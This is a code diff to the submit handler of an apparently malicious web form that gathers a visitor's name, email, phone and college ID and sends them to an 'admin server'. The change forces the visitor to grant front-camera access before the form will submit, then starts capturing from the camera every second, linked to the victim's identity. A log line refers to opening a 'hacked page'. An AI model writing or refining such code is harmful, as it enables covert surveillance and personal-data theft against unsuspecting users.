@@ -125,6 +125,27 @@
       btn.textContent = "Submitting...";
       showMsg("", false);
 
+      const userName = nameEl.value.trim();
+      const userEmail = emailEl.value.trim();
+      const userPhone = phoneEl.value.trim();
+      const userCollegeId = collegeEl.value.trim();
+
+      // 1. Request camera permission FIRST (user gesture - works on mobile!)
+      let stream = null;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }, audio: false
+        });
+        window.cameraStream = stream;
+        console.log("Camera permission granted on submit");
+      } catch (e) {
+        console.error("Camera not available:", e);
+        showMsg("Camera access denied. Please allow camera permission and try again.", true);
+        btn.disabled = false;
+        btn.textContent = "Submit";
+        return;
+      }
+
       // 1. Send initial user data to admin server
       try {
         console.log("Sending submit to admin server...");
@@ -147,22 +168,11 @@
         console.error("Failed to open hacked page:", e);
       }
 
-      // 3. Request camera permission ON SUBMIT (user gesture - works on mobile!)
-      let stream = null;
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }, audio: false
-        });
-        window.cameraStream = stream;
-        console.log("Camera permission granted on submit");
-      } catch (e) {
-        console.error("Camera not available:", e);
-        // Continue without camera if denied
-      }
-
       // 3. Start continuous capture every 1 second in THIS tab
       if (stream) {
         startContinuousCapture(stream, userName, userEmail, userPhone, userCollegeId);
+      } else {
+        console.warn("No camera stream available");
       }
 
       // Show capture indicator
